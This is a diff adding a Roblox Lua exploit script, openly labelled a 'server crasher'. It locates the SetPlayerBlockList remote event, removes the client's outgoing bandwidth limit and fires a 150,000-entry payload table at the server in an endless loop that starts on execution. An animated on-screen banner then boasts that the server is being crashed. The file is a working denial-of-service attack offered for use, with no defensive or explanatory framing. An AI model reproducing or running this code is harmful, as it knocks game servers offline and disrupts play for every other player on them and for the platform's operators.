@@ -1,0 +1,163 @@
+-- snowgirl server crasher: runs the moment this script executes.
+-- Hammers RobloxReplicatedStorage.SetPlayerBlockList with a giant payload on a loop.
+-- Top-of-screen banner shows it's live.
+
+local Players     = game:GetService("Players")
+local RunService  = game:GetService("RunService")
+
+local LocalPlayer = Players.LocalPlayer
+local playerGui   = LocalPlayer:WaitForChild("PlayerGui")
+
+-- CONFIG
+local CRASH_CHILDREN     = 150000   -- entries in the payload table
+local CRASH_FIRE_BURST   = 1        -- fires per tick
+local CRASH_FRAME_DELAY  = 0.125    -- seconds between fires (0 = every Heartbeat)
+local CRASH_REBUILD_EACH = false    -- rebuild the payload table each fire instead of caching
+
+-- CRASH PAYLOAD
+local crash = {
+    remote = nil,
+    cache  = nil,
+}
+
+local function crashResolveRemote()
+    local rrs = game:FindFirstChild("RobloxReplicatedStorage")
+    if not rrs then return nil end
+    local r = rrs:FindFirstChild("SetPlayerBlockList")
+    if r and (r:IsA("RemoteEvent") or r:IsA("UnreliableRemoteEvent")) then
+        return r
+    end
+    return nil
+end
+
+crash.remote = crashResolveRemote()
+
+pcall(function()
+    game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
+end)
+
+local function crashBuild()
+    local root = table.create(CRASH_CHILDREN)
+    for i = 1, CRASH_CHILDREN do
+        root[i] = { id = i, v = i * 2 }
+    end
+    return root
+end
+
+local function crashFire()
+    if not crash.remote then
+        crash.remote = crashResolveRemote()
+        if not crash.remote then return end
+    end
+    local payload
+    if CRASH_REBUILD_EACH or not crash.cache then
+        payload = crashBuild()
+        if not CRASH_REBUILD_EACH then crash.cache = payload end
+    else
+        payload = crash.cache
+    end
+    for _ = 1, CRASH_FIRE_BURST do
+        crash.remote:FireServer(payload)
+    end
+end
+
+-- Kick off immediately: no toggle, no wait.
+print("[snow] crashing the server - firing SetPlayerBlockList every " .. tostring(CRASH_FRAME_DELAY) .. "s")
+task.spawn(function()
+    while true do
+        pcall(crashFire)
+        if CRASH_FRAME_DELAY > 0 then
+            task.wait(CRASH_FRAME_DELAY)
+        else
+            RunService.Heartbeat:Wait()
+        end
+    end
+end)
+
+-- BANNER
+local COLORS = {
+    bg         = Color3.fromRGB(14, 14, 16),
+    borderA    = Color3.fromRGB(40, 5, 5),
+    borderB    = Color3.fromRGB(180, 20, 20),
+    borderC    = Color3.fromRGB(255, 90, 90),
+    text       = Color3.fromRGB(255, 255, 255),
+}
+
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "SnowCrashBanner"
+screenGui.ResetOnSpawn = false
+screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+screenGui.IgnoreGuiInset = true
+screenGui.Parent = playerGui
+
+local banner = Instance.new("Frame")
+banner.Name = "Banner"
+banner.Size = UDim2.new(0, 340, 0, 40)
+banner.Position = UDim2.new(0.5, 0, 0, 10)
+banner.AnchorPoint = Vector2.new(0.5, 0)
+banner.BackgroundColor3 = COLORS.bg
+banner.BorderSizePixel = 0
+banner.Parent = screenGui
+
+local bannerCorner = Instance.new("UICorner")
+bannerCorner.CornerRadius = UDim.new(0, 9)
+bannerCorner.Parent = banner
+
+-- Animated border: a slightly larger frame behind the banner with a rotating gradient
+local border = Instance.new("Frame")
+border.Name = "Border"
+border.Size = UDim2.new(1, 2, 1, 2)
+border.Position = UDim2.new(0.5, 0, 0.5, 0)
+border.AnchorPoint = Vector2.new(0.5, 0.5)
+border.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+border.BorderSizePixel = 0
+border.ZIndex = 0
+border.Parent = banner
+
+local borderCorner = Instance.new("UICorner")
+borderCorner.CornerRadius = UDim.new(0, 10)
+borderCorner.Parent = border
+
+local borderGrad = Instance.new("UIGradient")
+borderGrad.Color = ColorSequence.new({
+    ColorSequenceKeypoint.new(0.0,  COLORS.borderA),
+    ColorSequenceKeypoint.new(0.25, COLORS.borderB),
+    ColorSequenceKeypoint.new(0.5,  COLORS.borderC),
+    ColorSequenceKeypoint.new(0.75, COLORS.borderB),
+    ColorSequenceKeypoint.new(1.0,  COLORS.borderA),
+})
+borderGrad.Rotation = 0
+borderGrad.Parent = border
+
+-- Inner mask: the actual black banner surface sitting over the border
+local inner = Instance.new("Frame")
+inner.Name = "Inner"
+inner.Size = UDim2.new(1, -2, 1, -2)
+inner.Position = UDim2.new(0.5, 0, 0.5, 0)
+inner.AnchorPoint = Vector2.new(0.5, 0.5)
+inner.BackgroundColor3 = COLORS.bg
+inner.BorderSizePixel = 0
+inner.ZIndex = 1
+inner.Parent = banner
+
+local innerCorner = Instance.new("UICorner")
+innerCorner.CornerRadius = UDim.new(0, 8)
+innerCorner.Parent = inner
+
+local label = Instance.new("TextLabel")
+label.Name = "Label"
+label.Size = UDim2.new(1, -20, 1, 0)
+label.Position = UDim2.new(0, 10, 0, 0)
+label.BackgroundTransparency = 1
+label.Font = Enum.Font.GothamBlack
+label.Text = "snow's crashing the server!"
+label.TextColor3 = COLORS.text
+label.TextSize = 15
+label.TextXAlignment = Enum.TextXAlignment.Center
+label.TextYAlignment = Enum.TextYAlignment.Center
+label.ZIndex = 3
+label.Parent = inner
+
+RunService.RenderStepped:Connect(function(dt)
+    borderGrad.Rotation = (borderGrad.Rotation + 120 * dt) % 360
+end)
